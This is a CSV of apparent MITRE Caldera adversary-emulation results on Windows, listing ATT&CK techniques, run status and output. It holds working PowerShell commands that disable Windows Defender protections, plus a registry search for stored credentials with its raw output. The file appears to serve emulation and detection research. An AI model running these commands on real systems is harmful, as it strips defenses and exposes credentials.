,Success,Tactic,Technique-name,ability-name,Technique-id,operation_fname,adversary_id,atomic_ordering,number_of_abilities,adversary_abilities_success_rate__status_code,adversary_abilities_success_rate__exit_code,all_steps__STATUSCODE,all_steps__output_STDOUT,all_steps__output_STDERR,all_steps__output_EXITCODE,all_steps__ability_command,all_steps__ability_description,all_steps__ability_name,all_steps__ability_tactic_techniquename_techniqueid,all_steps__platform,all_steps__executor
0,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Disable Windows Defender All'],defense-evasion :: T1562.001,operation__stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b007f6e8-4a87-4440-8888-29ceab047d9b__SAVED_2024-03-10_113348,stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__b007f6e8-4a87-4440-8888-29ceab047d9b,['b007f6e8-4a87-4440-8888-29ceab047d9b'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;'],['Disable Windows Defender All'],['Disable Windows Defender All'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
1,Initial-Success,defense-evasion,defense-evasion :: Impair Defenses: Disable or Modify Tools,defense-evasion :: ['Disable Windows Defender Real-Time Protection'],defense-evasion :: T1562.001,operation__stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__49470433-30ce-4714-a44b-bea9dbbeca9a__SAVED_2024-03-10_112457,stockpile_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__49470433-30ce-4714-a44b-bea9dbbeca9a,['49470433-30ce-4714-a44b-bea9dbbeca9a'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['if (Get-Command ""Set-MPPreference"" -ErrorAction SilentlyContinue) {  Set-MPPreference -DisableRealtimeMonitoring 1;} else {  $service = Get-Service WinDefend -ErrorAction SilentlyContinue;  if ($service) {    if ($service.Status -eq ""Running"") {      Stop-Service WinDefend;    }  } else {    echo ""Windows Defender service not found."";    exit 1;  };};']",['Disable Windows Defender Real-Time Protection'],['Disable Windows Defender Real-Time Protection'],"[{'tactic': 'defense-evasion', 'technique_name': 'Impair Defenses: Disable or Modify Tools', 'technique_id': 'T1562.001'}]",['windows'],['psh']
3,Initial-Success,credential-access,credential-access :: Unsecured Credentials: Credentials in Registry,credential-access :: ['Credentials in Registry - HKLM'],credential-access :: T1552.002,operation__stockpile_windows_depfalse_pshtrue__t1552_002__credential-access__unsecured_credentials-_credentials_in_registry__98e58fc4-3843-4511-89b1-50cb872e0c9b__SAVED_2024-03-10_105813,stockpile_windows_depfalse_pshtrue__t1552_002__credential-access__unsecured_credentials-_credentials_in_registry__98e58fc4-3843-4511-89b1-50cb872e0c9b,['98e58fc4-3843-4511-89b1-50cb872e0c9b'],1,1,1,[0],"['HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{0fafd998-c8e8-42a1-86d7-7c10c664a415}    (Default)    REG_SZ    Picture Password Enrollment UXHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}    (Default)    REG_SZ    PicturePasswordLogonProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}    (Default)    REG_SZ    RASGCW Change Password ClassHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{2DE92DB3-CD3E-4ad6-80F9-089036E1C81E}    (Default)    REG_SZ    CLSID_HomeGroupRoamedPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{3bfe6eb7-281d-4333-999e-e949e3621de7}    (Default)    REG_SZ    Cert Password UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}    (Default)    REG_SZ    PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\ProgID    (Default)    REG_SZ    IAS.ChangePassword.1HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\VersionIndependentProgID    (Default)    REG_SZ    IAS.ChangePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}    (Default)    REG_SZ    V1PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}    InfoTip    REG_SZ    Manages users and passwords for this computerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{7be73787-ce71-4b33-b4c8-00d32b54bea8}    (Default)    REG_SZ    HomeGroup PasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}    (Default)    REG_SZ    LogonPasswordResetHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{9cb233a5-a4a5-46b9-ab13-db07ce949410}    (Default)    REG_SZ    Password retry UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{9fb45d27-dfe3-4383-b117-ab631787649a}    (Default)    REG_SZ    Picture Password Task HandlerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\\shell    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevicesHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{C98F3822-3658-4D75-8A25-6621665ECD56}    (Default)    REG_SZ    HomeGroup Password CommandHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{d9162b5b-ca81-476e-a310-cb32d932733c}    (Default)    REG_SZ    Password Expired UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\IAS.ChangePassword\\CurVer    (Default)    REG_SZ    IAS.ChangePassword.1HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}    (Default)    REG_SZ    IHomeGroupPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{1853A283-130E-427E-BED0-ACDEA5872DDD}    (Default)    REG_SZ    IProvideUserNameAndPasswordAssociationResponseHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}    (Default)    REG_SZ    _PasswordDeriveBytesHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{46ACA899-50F6-4A46-A9E3-273705CA4914}    (Default)    REG_SZ    IPicturePasswordTaskHandlerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{53E78940-B62E-49F8-A69B-84CB8963A513}    (Default)    REG_SZ    IPasswordOnWakeSettingHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}    (Default)    REG_SZ    IPasswordVaultHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{68FFF241-CA49-4754-A3D8-4B4127518549}    (Default)    REG_SZ    ISupportPasswordModeHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{6ab18989-c720-41a7-a6c1-feadb36329a0}    (Default)    REG_SZ    IPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{72E67CC9-004E-50A5-A2FF-CD1DD5BB4707}    (Default)    REG_SZ    __FITypedEventHandler_2_Windows__CInternal__CUI__CAuth__CEnrollment__CPasswordCredentialEnrollment_IInspectableHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{8969ba84-c62a-4938-a80a-f7869ad99630}    (Default)    REG_SZ    Windows.Networking.UX.IEAPTLSCertPasswordUIPromptHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{97F17EF9-284E-4992-AE46-748EF75225BB}    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{9934b56b-2a2d-4505-9fde-4a76aa1b212f}    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInputFactoryHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{a38b29dd-3e53-4a2f-b6da-9bd13c58db43}    (Default)    REG_SZ    Windows.Networking.UX.IEAPPasswordChangeUIPromptHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{B350F361-BEF5-4F75-AA88-1C2870BDA397}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPicturePasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{CF9DA5AD-59AA-414D-9223-CD5F12E31119}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\Interface\\{e10deb05-6b58-4b7b-adc8-65cb74a3553d}    (Default)    REG_SZ    Windows.Networking.UX.IPasswordChangeInputHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\OneCoreContracts\\Windows.Internal.Shell.PasswordEnrollment\\Default    ActivatableClassId    REG_SZ    Windows.Internal.Shell.PlatformExtensions.PasswordEnrollment.PasswordEnrollmentManagerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}    (Default)    REG_SZ    PicturePasswordLogonProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}    (Default)    REG_SZ    RASGCW Change Password ClassHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{2DE92DB3-CD3E-4ad6-80F9-089036E1C81E}    (Default)    REG_SZ    CLSID_HomeGroupRoamedPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{3bfe6eb7-281d-4333-999e-e949e3621de7}    (Default)    REG_SZ    Cert Password UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}    (Default)    REG_SZ    PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\ProgID    (Default)    REG_SZ    IAS.ChangePassword.1HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\VersionIndependentProgID    (Default)    REG_SZ    IAS.ChangePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}    (Default)    REG_SZ    V1PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}    InfoTip    REG_SZ    Manages users and passwords for this computerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{7be73787-ce71-4b33-b4c8-00d32b54bea8}    (Default)    REG_SZ    HomeGroup PasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}    (Default)    REG_SZ    LogonPasswordResetHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{9cb233a5-a4a5-46b9-ab13-db07ce949410}    (Default)    REG_SZ    Password retry UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\\shell    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevicesHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{C98F3822-3658-4D75-8A25-6621665ECD56}    (Default)    REG_SZ    HomeGroup Password CommandHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\CLSID\\{d9162b5b-ca81-476e-a310-cb32d932733c}    (Default)    REG_SZ    Password Expired UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}    (Default)    REG_SZ    IHomeGroupPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{1853A283-130E-427E-BED0-ACDEA5872DDD}    (Default)    REG_SZ    IProvideUserNameAndPasswordAssociationResponseHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}    (Default)    REG_SZ    _PasswordDeriveBytesHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{46ACA899-50F6-4A46-A9E3-273705CA4914}    (Default)    REG_SZ    IPicturePasswordTaskHandlerHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{53E78940-B62E-49F8-A69B-84CB8963A513}    (Default)    REG_SZ    IPasswordOnWakeSettingHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}    (Default)    REG_SZ    IPasswordVaultHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{68FFF241-CA49-4754-A3D8-4B4127518549}    (Default)    REG_SZ    ISupportPasswordModeHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{6ab18989-c720-41a7-a6c1-feadb36329a0}    (Default)    REG_SZ    IPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{72E67CC9-004E-50A5-A2FF-CD1DD5BB4707}    (Default)    REG_SZ    __FITypedEventHandler_2_Windows__CInternal__CUI__CAuth__CEnrollment__CPasswordCredentialEnrollment_IInspectableHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{97F17EF9-284E-4992-AE46-748EF75225BB}    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{B350F361-BEF5-4F75-AA88-1C2870BDA397}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPicturePasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\WOW6432Node\\Interface\\{CF9DA5AD-59AA-414D-9223-CD5F12E31119}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Capabilities\\Roaming\\FormSuggest    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW AskHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_CredUI\\NoLocalPasswordResetQuestions    RegValueNameRedirect    REG_SZ    NoLocalPasswordResetQuestionsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_CtrlAltDel\\DisableChangePassword    RegValueNameRedirect    REG_SZ    DisableChangePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_EnhancedStorage\\DisablePasswordAuthentication    RegValueNameRedirect    REG_SZ    DisablePasswordAuthenticationHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_MSS-legacy\\Pol_MSS_DisableSavePassword    RegValueNameRedirect    REG_SZ    DisableSavePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_Power\\PW_PromptPasswordOnResume    RegValueNameRedirect    REG_SZ    PromptPasswordOnResumeHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_TabletPCInputPanel\\PasswordSecurity_1    RegValueNameRedirect    REG_SZ    PasswordSecurityStateHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_TabletPCInputPanel\\PasswordSecurity_2    RegValueNameRedirect    REG_SZ    PasswordSecurityStateHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\ADMX_TerminalServer\\TS_CLIENT_DISABLE_PASSWORD_SAVING_1    RegValueNameRedirect    REG_SZ    DisablePasswordSavingHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Authentication\\AllowAadPasswordReset    RegValueNameRedirect    REG_SZ    AllowPasswordResetHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\Browser\\AllowPasswordManager    GPBlockingRegValueName    REG_SZ    FormSuggest PasswordsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\CredentialProviders\\BlockPicturePassword    RegValueNameRedirect    REG_SZ    BlockDomainPicturePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\CredentialsUI\\DisablePasswordReveal    RegValueNameRedirect    REG_SZ    DisablePasswordRevealHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\AllowSimpleDevicePassword    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\AlphanumericDevicePasswordRequired    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\DevicePasswordExpiration    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\DevicePasswordHistory    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\MaxDevicePasswordFailedAttempts    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\MaxInactivityTimeDeviceLock    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\MinDevicePasswordComplexCharacters    parentPolicyMajor    REG_SZ    DevicePasswordEnabled    parentPolicyMinor    REG_SZ    AlphanumericDevicePasswordRequiredHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\DeviceLock\\MinDevicePasswordLength    parentPolicyMajor    REG_SZ    DevicePasswordEnabledHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\InternetExplorer\\AllowAutoComplete    RegValueNameRedirect    REG_SZ    FormSuggest PasswordsHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\LocalPoliciesSecurityOptions\\Accounts_LimitLocalAccountUseOfBlankPasswordsToConsoleLogonOnly    RegValueNameRedirect    REG_SZ    LimitBlankPasswordUseHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\LocalPoliciesSecurityOptions\\MicrosoftNetworkClient_SendUnencryptedPasswordToThirdPartySMBServers    RegValueNameRedirect    REG_SZ    EnablePlainTextPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\RemoteDesktopServices\\DoNotAllowPasswordSaving    RegValueNameRedirect    REG_SZ    DisablePasswordSavingHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\default\\RemoteDesktopServices\\PromptForPasswordUponConnection    RegValueNameRedirect    REG_SZ    fPromptForPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}    (Default)    REG_SZ    PicturePasswordLogonProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}    (Default)    REG_SZ    PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SO\\AUTH\\LOGON\\ASK    Text    REG_SZ    Prompt for user name and passwordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SO\\AUTH\\LOGON\\SILENT    Text    REG_SZ    Automatic logon with current user name and passwordHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\Event Forwarding Plugin    ConfigXML    REG_SZ    <PlugInConfiguration xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/PluginConfiguration"" Name=""Event Forwarding Plugin"" Filename=""C:\\Windows\\system32\\wevtfwd.dll"" SDKVersion=""1"" XmlRenderingType=""text"" UseSharedProcess=""false"" ProcessIdleTimeoutSec=""0"" RunAsUser="""" RunAsPassword="""" AutoRestart=""false"" Enabled=""true"" OutputBufferingMode=""Block"" ><Resources><Resource ResourceUri=""http://schemas.microsoft.com/wbem/wsman/1/windows/EventLog"" SupportsOptions=""true"" ><Security Uri="""" ExactMatch=""false"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GR;;;ER)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)"" /><Capability Type=""Subscribe"" SupportsFiltering=""true"" /></Resource></Resources><Quotas MaxConcurrentUsers=""2147483647"" MaxConcurrentOperationsPerUser=""2147483647"" MaxConcurrentOperations=""2147483647""/></PlugInConfiguration>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\Microsoft.PowerShell.Workflow    ConfigXML    REG_SZ                 <PlugInConfiguration xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/PluginConfiguration"" Name=""microsoft.powershell.workflow"" Filename=""%windir%\\system32\\pwrshplugin.dll"" SDKVersion=""2"" XmlRenderingType=""text"" UseSharedProcess=""true"" ProcessIdleTimeoutSec=""1209600"" RunAsUser="""" RunAsPassword="""" AutoRestart=""false""     Enabled=""true"" >                 <InitializationParameters>                     <Param Name=""PSVersion"" Value=""5.1""/>                     <Param Name=""AssemblyName"" Value=""Microsoft.PowerShell.Workflow.ServiceCore, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL""/>                     <Param Name=""PSSessionConfigurationTypeName"" Value=""Microsoft.PowerShell.Workflow.PSWorkflowSessionConfiguration""/>                     <Param Name=""SessionConfigurationData""                          Value=""                             &lt;SessionConfigurationData&gt;                                 &lt;Param Name=&quot;ModulesToImport&quot; Value=&quot;%windir%\\system32\\windowspowershell\\v1.0\\Modules\\PSWorkflow&quot;/&gt;                                 &lt;Param Name=&quot;PrivateData&quot;&gt;                                     &lt;PrivateData&gt;                                         &lt;Param Name=&quot;enablevalidation&quot; Value=&quot;true&quot; /&gt;                                     &lt;/PrivateData&gt;                                 &lt;/Param&gt;                             &lt;/SessionConfigurationData&gt;                         ""                     />                 </InitializationParameters>                 <Resources>                     <Resource ResourceUri=""http://schemas.microsoft.com/powershell/microsoft.powershell.workflow"" SupportsOptions=""true"" ExactMatch=""true"">                         <Security xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/PluginConfiguration"" Uri=""http://schemas.microsoft.com/powershell/microsoft.powershell.workflow"" ExactMatch=""true"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD)""/>                         <Capability Type=""Shell""/>                     </Resource>                 </Resources>     <Quotas MaxMemoryPerShellMB=""2147483647"" MaxIdleTimeoutms=""2147483647"" MaxConcurrentUsers=""2147483647"" IdleTimeoutms=""7200000"" MaxProcessesPerShell=""2147483647"" MaxConcurrentCommandsPerShell=""2147483647"" MaxShells=""2147483647"" MaxShellsPerUser=""2147483647""/>             </PlugInConfiguration>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\WMI Provider    ConfigXML    REG_SZ    <PlugInConfiguration xmlns=""http://schemas.microsoft.com/wbem/wsman/1/config/PluginConfiguration"" Name=""WMI Provider"" Filename=""C:\\Windows\\system32\\WsmWmiPl.dll"" SDKVersion=""1"" XmlRenderingType=""text"" UseSharedProcess=""false"" ProcessIdleTimeoutSec=""0"" RunAsUser="""" RunAsPassword="""" AutoRestart=""false"" Enabled=""true"" OutputBufferingMode=""Block"" ><Resources><Resource ResourceUri=""http://schemas.microsoft.com/wbem/wsman/1/wmi"" SupportsOptions=""true"" ><Security Uri="""" ExactMatch=""false"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;IU)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)"" /><Capability Type=""Identify"" /><Capability Type=""Get"" SupportsFragment=""true"" /><Capability Type=""Put"" SupportsFragment=""true"" /><Capability Type=""Invoke"" /><Capability Type=""Create"" /><Capability Type=""Delete"" /><Capability Type=""Enumerate"" SupportsFiltering=""true""/><Capability Type=""Subscribe"" SupportsFiltering=""true""/></Resource><Resource ResourceUri=""http://schemas.dmtf.org/wbem/wscim/1/cim-schema"" SupportsOptions=""true"" ><Security Uri="""" ExactMatch=""false"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;IU)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)"" /><Capability Type=""Get"" SupportsFragment=""true"" /><Capability Type=""Put"" SupportsFragment=""true"" /><Capability Type=""Invoke"" /><Capability Type=""Create"" /><Capability Type=""Delete"" /><Capability Type=""Enumerate""/><Capability Type=""Subscribe"" SupportsFiltering=""true""/></Resource><Resource ResourceUri=""http://schemas.dmtf.org/wbem/wscim/1/*"" SupportsOptions=""true"" ExactMatch=""true"" ><Security Uri="""" ExactMatch=""false"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;IU)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)"" /><Capability Type=""Enumerate"" SupportsFiltering=""true""/><Capability Type=""Subscribe""SupportsFiltering=""true""/></Resource><Resource ResourceUri=""http://schemas.dmtf.org/wbem/cim-xml/2/cim-schema/2/*"" SupportsOptions=""true"" ExactMatch=""true""><Security Uri="""" ExactMatch=""false"" Sddl=""O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;IU)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GWGX;;;WD)"" /><Capability Type=""Get"" SupportsFragment=""false""/><Capability Type=""Enumerate"" SupportsFiltering=""true""/></Resource></Resources><Quotas MaxConcurrentUsers=""2147483647"" MaxConcurrentOperationsPerUser=""2147483647"" MaxConcurrentOperations=""2147483647""/></PlugInConfiguration>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}    